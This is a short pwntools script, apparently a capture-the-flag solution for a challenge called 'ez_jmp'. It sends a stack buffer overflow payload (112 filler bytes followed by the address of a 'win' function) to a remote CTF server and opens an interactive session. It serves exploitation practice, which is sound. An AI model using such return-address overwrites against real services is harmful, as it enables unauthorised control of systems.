from pwn import *

elf=ELF("ez_jmp")
offset=112
#r=elf.process()
r=remote("ctf.hackusati.tech",7001)
payload=b"A"*offset
payload+=p32(elf.symbols["win"])

r.sendline(payload)

r.interactive()
